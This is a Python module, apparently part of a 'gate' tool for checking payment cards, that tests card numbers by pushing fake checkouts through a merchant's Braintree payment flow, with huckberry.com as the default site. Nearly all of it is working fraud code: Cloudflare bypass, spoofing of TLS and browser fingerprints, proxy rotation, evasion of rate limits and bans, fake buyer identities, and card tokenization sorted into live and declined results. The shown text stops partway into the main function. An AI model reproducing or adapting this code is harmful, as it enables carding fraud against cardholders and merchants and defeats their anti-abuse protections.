import json
import re
import base64
import random
import string
import logging
import time
import threading
import uuid
import warnings
from urllib.parse import urlparse

try:
    from curl_cffi import requests as cffi_requests
    HAS_CURL_CFFI = True
except ImportError:
    cffi_requests = None
    HAS_CURL_CFFI = False

try:
    import cloudscraper
    HAS_CLOUDSCRAPER = True
except ImportError:
    cloudscraper = None
    HAS_CLOUDSCRAPER = False

import requests as std_requests

from urllib3.exceptions import InsecureRequestWarning
from faker import Faker
from config import get_gate_setting, get_random_ua, get_proxy_dict, is_proxy_enabled, blacklist_proxy
from human_behavior import (human_delay, reading_delay, typing_delay, form_fill_delay,
                            navigation_delay, pre_submit_delay, between_requests_delay,
                            page_interaction_delay, checkout_flow_delay, retry_delay)

warnings.filterwarnings('ignore', category=InsecureRequestWarning)

logger = logging.getLogger(__name__)
fake = Faker()

_rate_lock = threading.Lock()
_last_request_time = 0
_MIN_DELAY = 1.5

_BRAINTREE_VERSIONS = [
    '2018-05-10',
    '2024-08-01',
]

_CHROME_IMPERSONATIONS = [
    "chrome131", "chrome124", "chrome123", "chrome120",
    "chrome119", "chrome116", "chrome110",
]

_CF_BYPASS_IMPERSONATIONS = [
    "chrome131", "chrome124", "chrome123", "chrome120",
    "safari17_0", "safari15_5", "edge101", "edge99",
    "chrome119", "chrome116", "chrome110", "chrome107",
]

_BT_FINGERPRINTS = [
    {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'sec_ch_ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'platform': '"Windows"',
        'mobile': '?0',
    },
    {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'sec_ch_ua': '"Chromium";v="125", "Google Chrome";v="125", "Not-A.Brand";v="24"',
        'platform': '"Windows"',
        'mobile': '?0',
    },
    {
        'ua': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'sec_ch_ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'platform': '"macOS"',
        'mobile': '?0',
    },
    {
        'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36',
        'sec_ch_ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
        'platform': '"Android"',
        'mobile': '?1',
    },
    {
        'ua': 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
        'sec_ch_ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="8"',
        'platform': '"Android"',
        'mobile': '?1',
    },
    {
        'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
        'sec_ch_ua': '',
        'platform': '"iOS"',
        'mobile': '?1',
    },
    {
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'sec_ch_ua': '"Chromium";v="126", "Google Chrome";v="126", "Not-A.Brand";v="24"',
        'platform': '"Windows"',
        'mobile': '?0',
    },
    {
        'ua': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
        'sec_ch_ua': '"Chromium";v="123", "Google Chrome";v="123", "Not-A.Brand";v="24"',
        'platform': '"Linux"',
        'mobile': '?0',
    },
]

_US_ADDRESSES = [
    {"city": "New York", "state": "NY", "zip": "10001", "state_id": 48, "area": "212"},
    {"city": "Los Angeles", "state": "CA", "zip": "90001", "state_id": 5, "area": "213"},
    {"city": "Chicago", "state": "IL", "zip": "60601", "state_id": 13, "area": "312"},
    {"city": "Houston", "state": "TX", "zip": "77001", "state_id": 43, "area": "713"},
    {"city": "Phoenix", "state": "AZ", "zip": "85001", "state_id": 3, "area": "602"},
    {"city": "Philadelphia", "state": "PA", "zip": "19101", "state_id": 38, "area": "215"},
    {"city": "San Antonio", "state": "TX", "zip": "78201", "state_id": 43, "area": "210"},
    {"city": "San Diego", "state": "CA", "zip": "92101", "state_id": 5, "area": "619"},
    {"city": "Dallas", "state": "TX", "zip": "75201", "state_id": 43, "area": "214"},
    {"city": "San Jose", "state": "CA", "zip": "95101", "state_id": 5, "area": "408"},
    {"city": "Austin", "state": "TX", "zip": "78701", "state_id": 43, "area": "512"},
    {"city": "Jacksonville", "state": "FL", "zip": "32099", "state_id": 9, "area": "904"},
    {"city": "Columbus", "state": "OH", "zip": "43085", "state_id": 35, "area": "614"},
    {"city": "Charlotte", "state": "NC", "zip": "28201", "state_id": 33, "area": "704"},
    {"city": "Denver", "state": "CO", "zip": "80201", "state_id": 6, "area": "303"},
    {"city": "Seattle", "state": "WA", "zip": "98101", "state_id": 47, "area": "206"},
    {"city": "Miami", "state": "FL", "zip": "33101", "state_id": 9, "area": "305"},
    {"city": "Atlanta", "state": "GA", "zip": "30301", "state_id": 10, "area": "404"},
    {"city": "Boston", "state": "MA", "zip": "02101", "state_id": 21, "area": "617"},
    {"city": "Portland", "state": "OR", "zip": "97201", "state_id": 37, "area": "503"},
]


def _random_address():
    return random.choice(_US_ADDRESSES)


def _get_fingerprint():
    return random.choice(_BT_FINGERPRINTS)


class _SiteCooldownTracker:
    def __init__(self):
        self._lock = threading.Lock()
        self._site_checks = {}
        self._site_last_check = {}
        self._site_blocks = {}

    def get_site_key(self, url):
        try:
            return urlparse(url).netloc.lower()
        except Exception:
            return url.lower()

    def record_check(self, site_url):
        key = self.get_site_key(site_url)
        with self._lock:
            now = time.time()
            if key not in self._site_checks:
                self._site_checks[key] = []
            self._site_checks[key] = [t for t in self._site_checks[key] if now - t < 600]
            self._site_checks[key].append(now)
            self._site_last_check[key] = now

    def record_block(self, site_url):
        key = self.get_site_key(site_url)
        with self._lock:
            now = time.time()
            if key not in self._site_blocks:
                self._site_blocks[key] = 0
            self._site_blocks[key] += 1
            block_count = self._site_blocks[key]
            cooldown = min(5, 1.0 * block_count)
            logger.warning(f"BT site cooldown: {key} blocked {block_count}x, cooling down {cooldown}s")

    def get_cooldown_delay(self, site_url):
        key = self.get_site_key(site_url)
        with self._lock:
            now = time.time()
            recent = [t for t in self._site_checks.get(key, []) if now - t < 600]
            count = len(recent)
            blocks = self._site_blocks.get(key, 0)

            if blocks >= 3:
                return random.uniform(0.5, 1.5)
            if blocks >= 1:
                return random.uniform(0.3, 0.8)

            if count >= 10:
                return random.uniform(0.5, 1.5)
            elif count >= 6:
                return random.uniform(0.3, 0.8)
            elif count >= 3:
                return random.uniform(0.1, 0.4)
            elif count >= 1:
                return random.uniform(0.05, 0.2)
            return 0

    def reset_site(self, site_url):
        key = self.get_site_key(site_url)
        with self._lock:
            self._site_checks.pop(key, None)
            self._site_blocks.pop(key, None)
            self._site_last_check.pop(key, None)

    def get_stats(self, site_url=None):
        with self._lock:
            if site_url:
                key = self.get_site_key(site_url)
                now = time.time()
                recent = [t for t in self._site_checks.get(key, []) if now - t < 600]
                return {
                    'checks_10min': len(recent),
                    'blocks': self._site_blocks.get(key, 0),
                    'last_check': self._site_last_check.get(key, 0),
                }
            return {
                'tracked_sites': len(self._site_checks),
                'total_blocks': sum(self._site_blocks.values()),
            }


_site_cooldown = _SiteCooldownTracker()


def get_site_cooldown():
    return _site_cooldown


class _BraintreeRateLimiter:
    def __init__(self):
        self._lock = threading.Lock()
        self._last_request = 0
        self._min_delay = 0.3
        self._backoff_level = 0
        self._max_backoff = 4
        self._rate_limits = 0
        self._bans = 0
        self._ban_until = 0
        self._successes = 0
        self._consecutive_errors = 0

    def wait_if_needed(self):
        with self._lock:
            now = time.time()
            if now < self._ban_until:
                wait = self._ban_until - now
                logger.warning(f"BT rate limiter: banned, waiting {wait:.0f}s")
                time.sleep(wait)
            delay = self._min_delay + (self._backoff_level * random.uniform(0.2, 0.5))
            elapsed = time.time() - self._last_request
            if elapsed < delay:
                time.sleep(delay - elapsed)
            self._last_request = time.time()

    def record_success(self):
        with self._lock:
            self._successes += 1
            self._consecutive_errors = 0
            if self._backoff_level > 0:
                self._backoff_level = max(0, self._backoff_level - 1)

    def record_rate_limit(self):
        with self._lock:
            self._rate_limits += 1
            self._consecutive_errors += 1
            self._backoff_level = min(self._max_backoff, self._backoff_level + 1)
            if self._consecutive_errors >= 3:
                self._ban_until = time.time() + 8

    def record_ban(self, duration=12):
        with self._lock:
            self._bans += 1
            self._ban_until = time.time() + duration
            self._backoff_level = self._max_backoff

    def get_stats(self):
        with self._lock:
            return {
                'backoff_level': self._backoff_level,
                'rate_limits': self._rate_limits,
                'bans': self._bans,
                'is_banned': time.time() < self._ban_until,
                'successes': self._successes,
            }


_bt_rate_limiter = _BraintreeRateLimiter()


def get_bt_rate_limiter():
    return _bt_rate_limiter


class _CFBypassCache:
    def __init__(self, max_age=300):
        self._lock = threading.Lock()
        self._cache = {}
        self._max_age = max_age
        self._success_impersonate = {}

    def get_cookies(self, site_key):
        with self._lock:
            entry = self._cache.get(site_key)
            if entry and time.time() - entry['time'] < self._max_age:
                return entry['cookies'].copy(), entry.get('impersonate')
            return None, None

    def save_cookies(self, site_key, cookies, impersonate=None):
        with self._lock:
            self._cache[site_key] = {
                'cookies': dict(cookies) if cookies else {},
                'time': time.time(),
                'impersonate': impersonate,
            }
            if impersonate:
                self._success_impersonate[site_key] = impersonate

    def get_best_impersonate(self, site_key):
        with self._lock:
            return self._success_impersonate.get(site_key)

    def invalidate(self, site_key):
        with self._lock:
            self._cache.pop(site_key, None)


_cf_cache = _CFBypassCache()


class _ProvenProxyTracker:
    def __init__(self, max_age=600, max_proxies=20):
        self._lock = threading.Lock()
        self._proven = {}
        self._max_age = max_age
        self._max_proxies = max_proxies

    def record_success(self, site_key, proxy_addr, impersonate=None):
        with self._lock:
            if site_key not in self._proven:
                self._proven[site_key] = []
            self._proven[site_key] = [
                e for e in self._proven[site_key]
                if time.time() - e['time'] < self._max_age
            ]
            self._proven[site_key] = [
                e for e in self._proven[site_key] if e['proxy'] != proxy_addr
            ]
            self._proven[site_key].insert(0, {
                'proxy': proxy_addr,
                'impersonate': impersonate,
                'time': time.time(),
                'successes': 1,
            })
            if len(self._proven[site_key]) > self._max_proxies:
                self._proven[site_key] = self._proven[site_key][:self._max_proxies]

    def get_proven_proxy(self, site_key):
        with self._lock:
            entries = self._proven.get(site_key, [])
            entries = [e for e in entries if time.time() - e['time'] < self._max_age]
            self._proven[site_key] = entries
            if entries:
                entry = entries[0]
                return entry['proxy'], entry.get('impersonate')
            return None, None


_proven_proxies = _ProvenProxyTracker()


class _SiteSessionCache:
    def __init__(self, max_age=300):
        self._lock = threading.Lock()
        self._sessions = {}
        self._max_age = max_age

    def get(self, site_key):
        with self._lock:
            entry = self._sessions.get(site_key)
            if entry and time.time() - entry['time'] < self._max_age:
                return entry
            if entry:
                del self._sessions[site_key]
            return None

    def save(self, site_key, cookies, csrf_token, proxy_addr, impersonate, session_obj=None):
        with self._lock:
            self._sessions[site_key] = {
                'cookies': dict(cookies) if cookies else {},
                'csrf_token': csrf_token,
                'proxy_addr': proxy_addr,
                'impersonate': impersonate,
                'time': time.time(),
            }

    def invalidate(self, site_key):
        with self._lock:
            self._sessions.pop(site_key, None)


_site_session_cache = _SiteSessionCache()


def _rate_wait():
    _bt_rate_limiter.wait_if_needed()


def _make_session(use_proxy=True, force_cloudscraper=False, cf_bypass=False, cf_attempt=0, site_key=None, force_proxy_addr=None, force_impersonate=None):
    proxy_addr = None
    proxy_url = None
    if force_proxy_addr:
        proxy_addr = force_proxy_addr
        proxy_url = f"http://{force_proxy_addr}"
    elif use_proxy and is_proxy_enabled():
        proxy = get_proxy_dict()
        if proxy:
            proxy_url = proxy.get('http', '') or proxy.get('https', '')
            proxy_addr = proxy_url.replace('http://', '').replace('https://', '')
            logger.debug(f"BT session proxy: {proxy_addr[:30] if proxy_addr else 'none'}")

    if cf_bypass and HAS_CURL_CFFI:
        if force_impersonate:
            impersonate = force_impersonate
        else:
            best = _cf_cache.get_best_impersonate(site_key) if site_key else None
            if best and cf_attempt == 0:
                impersonate = best
            else:
                used = set()
                if best:
                    used.add(best)
                available = [p for p in _CF_BYPASS_IMPERSONATIONS if p not in used]
                if cf_attempt < len(available):
                    impersonate = available[cf_attempt % len(available)]
                else:
                    impersonate = random.choice(_CF_BYPASS_IMPERSONATIONS)

        s = cffi_requests.Session(impersonate=impersonate)  # type: ignore[union-attr]
        s._is_cffi = True  # type: ignore[attr-defined]
        s._is_cloudscraper = False  # type: ignore[attr-defined]
        s._has_proxy = bool(proxy_url)  # type: ignore[attr-defined]
        s._impersonate = impersonate  # type: ignore[attr-defined]
        if proxy_url:
            s.proxies = {"http": proxy_url, "https": proxy_url}

        cached_cookies, _ = _cf_cache.get_cookies(site_key) if site_key else (None, None)
        if cached_cookies:
            for k, v in cached_cookies.items():
                s.cookies.set(k, v)
            logger.info(f"BT session: curl_cffi CF bypass ({impersonate}) + cached cookies")
        else:
            logger.info(f"BT session: curl_cffi CF bypass ({impersonate})")
        return s, proxy_addr

    if force_cloudscraper and HAS_CLOUDSCRAPER:
        fp = _get_fingerprint()
        browser_cfg = {
            'browser': 'chrome',
            'platform': 'windows' if 'Windows' in fp['platform'] else ('darwin' if 'mac' in fp['platform'].lower() else 'linux'),
            'desktop': True,
        }
        s = cloudscraper.create_scraper(browser=browser_cfg, delay=random.uniform(0.5, 1.5))  # type: ignore[union-attr]
        s._is_cffi = False  # type: ignore[attr-defined]
        s._is_cloudscraper = True  # type: ignore[attr-defined]
        s._has_proxy = bool(proxy_url)  # type: ignore[attr-defined]
        s._impersonate = None  # type: ignore[attr-defined]
        s.headers.update({
            'User-Agent': fp['ua'],
            'Accept-Language': 'en-US,en;q=0.9',
        })
        if proxy_url:
            s.proxies.update({"http": proxy_url, "https": proxy_url})
        logger.info("BT session: cloudscraper (Cloudflare bypass)")
        return s, proxy_addr

    if HAS_CURL_CFFI:
        impersonate = random.choice(_CHROME_IMPERSONATIONS)
        s = cffi_requests.Session(impersonate=impersonate)  # type: ignore[union-attr]
        s._is_cffi = True  # type: ignore[attr-defined]
        s._is_cloudscraper = False  # type: ignore[attr-defined]
        s._has_proxy = bool(proxy_url)  # type: ignore[attr-defined]
        s._impersonate = impersonate  # type: ignore[attr-defined]
        if proxy_url:
            s.proxies = {"http": proxy_url, "https": proxy_url}
        logger.debug(f"BT session: curl_cffi ({impersonate})")
    else:
        fp = _get_fingerprint()
        s = std_requests.Session()
        s._is_cffi = False  # type: ignore[attr-defined]
        s._is_cloudscraper = False  # type: ignore[attr-defined]
        s._has_proxy = bool(proxy_url)  # type: ignore[attr-defined]
        s._impersonate = None  # type: ignore[attr-defined]
        s.headers.update({
            'User-Agent': fp['ua'],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Sec-Ch-Ua': fp['sec_ch_ua'],
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': fp['platform'],
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
        })
        s.verify = False
        if proxy_url:
            s.proxies.update({"http": proxy_url, "https": proxy_url})
        logger.debug("BT session: standard requests (fallback)")
    return s, proxy_addr


def _session_has_proxy(s):
    return getattr(s, '_has_proxy', False)


def _error_result(cc, mes, ano, cvv, detail):
    return {
        'status': 'error',
        'detail': detail,
        'gate': 'Braintree',
        'card': f"{cc}|{mes}|{ano}|{cvv}",
    }


def _rnd_email():
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'protonmail.com',
               'icloud.com', 'aol.com', 'mail.com', 'zoho.com']
    name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10)))
    num = random.randint(10, 9999)
    return f"{name}{num}@{random.choice(domains)}"


def _is_ban_signal(text):
    if not text:
        return False
    t = text.lower()
    if 'cloudflare' in t:
        return False
    return any(s in t for s in [
        "rate limit", "too many requests", "429", "blocked",
        "access denied", "forbidden", "captcha",
        "please try again later", "temporarily unavailable",
    ])


def _is_cloudflare_challenge(response):
    if response is None:
        return False
    if response.status_code not in (403, 503):
        return False
    text = response.text[:500].lower()
    return any(sig in text for sig in [
        'just a moment', 'cloudflare', 'cf-browser-verification',
        'challenge-platform', 'cf_chl_opt', 'ray id',
        'cdn-cgi/challenge-platform', '_cf_chl',
    ])


def _check_hybrid_bt(cc, mes, ano, cvv, site_url, add_to_cart_path, checkout_path, product_payload, payment_method_id, country_code="US"):
    from hybrid_braintree import hybrid_bt_session, _transfer_cookies_to_session

    logger.info(f"[HybridBT] Starting hybrid check for {cc[:6]}...")

    hybrid_result = hybrid_bt_session(site_url, checkout_path)

    if not hybrid_result.get("success"):
        err = hybrid_result.get("error", "Hybrid session failed")
        logger.warning(f"[HybridBT] Session failed: {err}")
        return _error_result(cc, mes, ano, cvv, f"[H] BT hybrid session failed: {err[:50]}")

    cookies = hybrid_result.get("cookies", {})
    raw_cookies = hybrid_result.get("raw_cookies", [])
    csrf_token = hybrid_result.get("csrf_token")
    auth_fingerprint = hybrid_result.get("auth_fingerprint")
    bt_client_token = hybrid_result.get("bt_client_token")
    signals = hybrid_result.get("fingerprint_signals", [])

    if signals:
        logger.info(f"[HybridBT] Fingerprint signals: {', '.join(signals[:5])}")

    s, proxy_addr = _make_session(use_proxy=False, cf_bypass=HAS_CURL_CFFI, site_key=_site_cooldown.get_site_key(site_url))

    if cookies:
        _transfer_cookies_to_session(s, cookies, raw_cookies)
        logger.info(f"[HybridBT] Transferred {len(cookies)} cookies to requests session")

    if not csrf_token:
        try:
            home_res = s.get(site_url, timeout=10)
            if home_res.status_code == 200:
                csrf_patterns = [
                    r'<meta\s+name="csrf-token"\s+content="([^"]+)"',
                    r'content="([^"]+)"[^>]*name="csrf-token"',
                    r'"csrf[_-]?token"\s*:\s*"([^"]+)"',
                    r'name="authenticity_token"\s+value="([^"]+)"',
                ]
                for pat in csrf_patterns:
                    m = re.search(pat, home_res.text)
                    if m:
                        csrf_token = m.group(1)
                        break
        except Exception as e:
            logger.warning(f"[HybridBT] CSRF fallback fetch failed: {str(e)[:40]}")

    if not csrf_token:
        s.close()
        return _error_result(cc, mes, ano, cvv, "[H] No CSRF token from hybrid session")

    ajax_headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrf_token,
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }

    if not product_payload:
        cart_json = {"variant_id": 266672, "quantity": 1}
    else:
        try:
            cart_json = json.loads(product_payload) if isinstance(product_payload, str) else product_payload
        except Exception:
            cart_json = {"variant_id": 266672, "quantity": 1}

    try:
        cart_url = f"{site_url}{add_to_cart_path}"
        cart_res = s.post(cart_url, json=cart_json, headers=ajax_headers, timeout=10)
    except Exception as e:
        s.close()
        return _error_result(cc, mes, ano, cvv, f"[H] Cart failed: {str(e)[:50]}")

    logger.info(f"[HybridBT] Cart response {cart_res.status_code}")

    order_number = None
    order_token = None
    if cart_res.status_code in (200, 201):
        try:
            cart_data = cart_res.json()
            order_number = cart_data.get('orderNumber', '') or cart_data.get('order_number', '') or cart_data.get('number', '')
            order_token = cart_data.get('orderToken', '') or cart_data.get('order_token', '') or cart_data.get('token', '')
        except Exception:
            pass

    dynamic_checkout_url = None
    if cart_res.status_code in (200, 201):
        try:
            cart_data = cart_res.json()
            checkout_url_path = cart_data.get('checkout_url', '') or cart_data.get('checkoutUrl', '')
            if checkout_url_path:
                if checkout_url_path.startswith('/'):
                    dynamic_checkout_url = f"{site_url}/api{checkout_url_path}"
                elif checkout_url_path.startswith('http'):
                    dynamic_checkout_url = checkout_url_path
                else:
                    dynamic_checkout_url = f"{site_url}/api/{checkout_url_path}"
        except Exception:
            pass

    if not order_number or not order_token:
        if dynamic_checkout_url:
            url_match = re.search(r'checkouts/([A-Z0-9]+)', dynamic_checkout_url)
            if url_match:
                order_number = url_match.group(1)
            token_in_url = re.search(r'order_token=([^&]+)', dynamic_checkout_url)
            if token_in_url:
                order_token = token_in_url.group(1)

    if not order_number or not order_token:
        try:
            checkout_url = f"{site_url}{checkout_path}"
            checkout_res = s.get(checkout_url, timeout=10)
            order_patterns = [
                r'/api/checkouts/(R\d+)\?order_token=([^"&\s]+)',
                r'/api/checkouts/([A-Z0-9]+)\?order_token=([^"&\s]+)',
            ]
            for op in order_patterns:
                m = re.search(op, checkout_res.text)
                if m:
                    order_number = m.group(1)
                    order_token = m.group(2)
                    break
            if not order_number:
                m2 = re.search(r'"order_number"\s*:\s*"([^"]+)"', checkout_res.text)
                if m2:
                    order_number = m2.group(1)
            if not order_token:
                m3 = re.search(r'"token"\s*:\s*"([^"]+)"', checkout_res.text)
                if m3:
                    order_token = m3.group(1)
            if not order_number:
                url_match = re.search(r'checkouts/([A-Z0-9]+)', checkout_res.url)
                if url_match:
                    order_number = url_match.group(1)
            if not order_token:
                token_in_url = re.search(r'order_token=([^&]+)', checkout_res.url)
                if token_in_url:
                    order_token = token_in_url.group(1)
        except Exception as e:
            logger.warning(f"[HybridBT] Checkout page fetch failed: {str(e)[:40]}")

    checkout_api_url = dynamic_checkout_url
    if not checkout_api_url and order_number:
        if order_token:
            checkout_api_url = f"{site_url}/api/checkouts/{order_number}?order_token={order_token}"
        else:
            checkout_api_url = f"{site_url}/api/checkouts/{order_number}"

    if not checkout_api_url:
        s.close()
        return _error_result(cc, mes, ano, cvv, "[H] Cannot extract order/token")

    f_name = fake.first_name()
    l_name = fake.last_name()
    email = _rnd_email()
    addr = _random_address()

    address_data = {
        "state": "address",
        "order": {
            "email": email,
            "ship_address_attributes": {
                "firstname": f_name, "lastname": l_name,
                "address1": fake.street_address(), "address2": "",
                "city": addr["city"], "zipcode": addr["zip"],
                "phone": f"{addr['area']}{random.randint(1000000, 9999999)}",
                "state_name": addr["state"], "state_text": addr["state"],
                "country": "United States", "state_id": addr["state_id"],
                "country_id": 49, "country_code": "US"
            },
        }
    }

    try:
        addr_res = s.put(checkout_api_url, json=address_data, headers=ajax_headers, timeout=12)
    except Exception as e:
        s.close()
        return _error_result(cc, mes, ano, cvv, f"[H] Address submit failed: {str(e)[:50]}")

    logger.info(f"[HybridBT] Address response {addr_res.status_code}")

    if not auth_fingerprint:
        try:
            addr_json = addr_res.json()
            raw_token = addr_json.get('braintreeClientToken', '') or addr_json.get('braintree_client_token', '')
            if not raw_token:
                raw_token = _extract_bt_token(addr_res.text)
            if raw_token:
                if not raw_token.endswith('='):
                    raw_token += '=' * (4 - len(raw_token) % 4)
                decoded = base64.b64decode(raw_token)
                bt_json_data = json.loads(decoded)
                auth_fingerprint = bt_json_data.get('authorizationFingerprint', '')
        except Exception as e:
            logger.warning(f"[HybridBT] BT token from address failed: {str(e)[:40]}")

    if not auth_fingerprint:
        s.close()
        return _error_result(cc, mes, ano, cvv, "[H] No auth fingerprint")

    logger.info("[HybridBT] Auth fingerprint ready, tokenizing card...")

    fp = _get_fingerprint()
    gql_payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "dropin",
            "sessionId": uuid.uuid4().hex
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc, "expirationMonth": mes, "expirationYear": ano, "cvv": cvv,
                    "billingAddress": {
                        "postalCode": addr["zip"], "streetAddress": fake.street_address(),
                        "firstName": f_name, "lastName": l_name,
                        "locality": addr["city"], "region": addr["state"],
                        "countryCodeAlpha2": country_code or "US"
                    }
                },
                "options": {"validate": False}
            }
        },
        "operationName": "TokenizeCreditCard"
    }

    gql_headers = {
        'Content-Type': 'application/json',
        'Authorization': f'Bearer {auth_fingerprint}',
        'Braintree-Version': random.choice(_BRAINTREE_VERSIONS),
        'Origin': site_url,
        'Referer': f'{site_url}/',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'User-Agent': fp['ua'],
        'Sec-Ch-Ua': fp['sec_ch_ua'],
        'Sec-Ch-Ua-Mobile': fp.get('mobile', '?0'),
        'Sec-Ch-Ua-Platform': fp['platform'],
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
    }
    if not fp.get('sec_ch_ua'):
        gql_headers.pop('Sec-Ch-Ua', None)
        gql_headers.pop('Sec-Ch-Ua-Mobile', None)
        gql_headers.pop('Sec-Ch-Ua-Platform', None)

    try:
        gql_res = std_requests.post(
            'https://payments.braintree-api.com/graphql',
            json=gql_payload, headers=gql_headers, timeout=12, verify=False,
        )
    except Exception as e:
        s.close()
        return _error_result(cc, mes, ano, cvv, f"[H] BT tokenize failed: {str(e)[:50]}")

    logger.info(f"[HybridBT] GQL tokenize response {gql_res.status_code}")

    if gql_res.status_code in (403, 429):
        s.close()
        return {**_error_result(cc, mes, ano, cvv, f"[H] BT API {gql_res.status_code}"), "_retry": True}

    try:
        gql_data = gql_res.json()
    except Exception:
        s.close()
        return _error_result(cc, mes, ano, cvv, "[H] BT tokenize invalid JSON")

    nonce = None
    brand_code = ""
    try:
        tc = gql_data.get('data', {}).get('tokenizeCreditCard', {})
        nonce = tc.get('token', '')
        cc_info = tc.get('creditCard', {})
        brand_code = cc_info.get('brandCode', '')
    except Exception:
        pass

    if not nonce:
        errors = gql_data.get('errors', [])
        if errors:
            err_msg = errors[0].get('message', 'Unknown tokenize error')
            err_lower = err_msg.lower()
            if any(kw in err_lower for kw in ['credit card number', 'invalid', 'cvv', 'expir']):
                s.close()
                return {'status': 'declined', 'detail': f'[H] {err_msg[:60]}', 'gate': 'Braintree Hybrid', 'card': f"{cc}|{mes}|{ano}|{cvv}"}
            s.close()
            return _error_result(cc, mes, ano, cvv, f"[H] Tokenize: {err_msg[:60]}")
        s.close()
        return _error_result(cc, mes, ano, cvv, "[H] No nonce from BT")

    logger.info(f"[HybridBT] Nonce created | brand={brand_code or '?'}")

    pmid = int(payment_method_id) if str(payment_method_id).isdigit() else payment_method_id
    device_session_id = str(time.time()).replace('.', '')
    device_data = json.dumps({
        "device_session_id": device_session_id,
        "fraud_merchant_id": None,
        "correlation_id": uuid.uuid4().hex
    })

    bill_address = {
        "firstname": f_name, "lastname": l_name,
        "address1": fake.street_address(), "address2": "",
        "city": addr["city"], "zipcode": addr["zip"],
        "phone": f"{addr['area']}{random.randint(1000000, 9999999)}",
        "state_name": None, "state_text": addr["state"],
        "state_id": addr["state_id"], "country_id": 49, "country_code": "US"
    }

    payment_data = {
        "state": "payment",
        "order": {
            "email": email,
            "bill_address_attributes": bill_address,
            "payments_attributes": [{
                "payment_method_id": pmid,
                "source_attributes": {
                    "name": f"{f_name} {l_name}",
                    "nonce": nonce,
                    "device_data": device_data,
                    "payment_type": "credit_card",
                    "address_attributes": bill_address.copy(),
                    "savable": True
                }
            }]
        }
    }

    try:
        pay_res = s.put(checkout_api_url, json=payment_data, headers=ajax_headers, timeout=15)
    except Exception as e:
        s.close()
        return _error_result(cc, mes, ano, cvv, f"[H] Payment failed: {str(e)[:50]}")

    logger.info(f"[HybridBT] Payment response {pay_res.status_code}")

    try:
        s.close()
    except Exception:
        pass

    result = _parse_braintree_result(pay_res.text, cc, mes, ano, cvv, brand_code)
    result['gate'] = 'Braintree Hybrid'
    if result.get('detail'):
        result['detail'] = f"[H] {result['detail']}"
    if result.get('result'):
        result['result'] = f"[H] {result['result']}"
    result['proxy_used'] = 'HYBRID-DIRECT'
    return result


def check_braintree(cc, mes, ano, cvv, country_code="US"):
    site_url = get_gate_setting("braintree", "site_url", "https://huckberry.com").rstrip("/")
    add_to_cart_path = get_gate_setting("braintree", "add_to_cart_path", "/orders/populate")
    checkout_path = get_gate_setting("braintree", "checkout_path", "/checkout/onepage")
    product_payload = get_gate_setting("braintree", "product_payload", "")
    payment_method_id = get_gate_setting("braintree", "payment_method_id", "3")

    mes = mes.zfill(2)
    if len(ano) == 2:
        ano = f"20{ano}"

    hybrid_on = get_gate_setting("braintree", "hybrid_mode", False)
    if hybrid_on:
        try:
            return _check_hybrid_bt(cc, mes, ano, cvv, site_url, add_to_cart_path, checkout_path, product_payload, payment_method_id, country_code)
        except Exception as e:
            logger.warning(f"BT Hybrid mode failed, falling back to standard: {str(e)[:60]}")

    cooldown = _site_cooldown.get_cooldown_delay(site_url)
    if cooldown > 0:
        jitter = random.uniform(0.8, 1.3)
        actual_delay = cooldown * jitter
        logger.info(f"Braintree: Site cooldown {actual_delay:.1f}s for {_site_cooldown.get_site_key(site_url)} (checks: {_site_cooldown.get_stats(site_url).get('checks_10min', 0)})")
        time.sleep(actual_delay)

    _site_cooldown.record_check(site_url)

    max_retries = 10
    last_error = "Unknown error"
    used_proxy = None
    cloudflare_detected = False
    cf_attempt_counter = 0
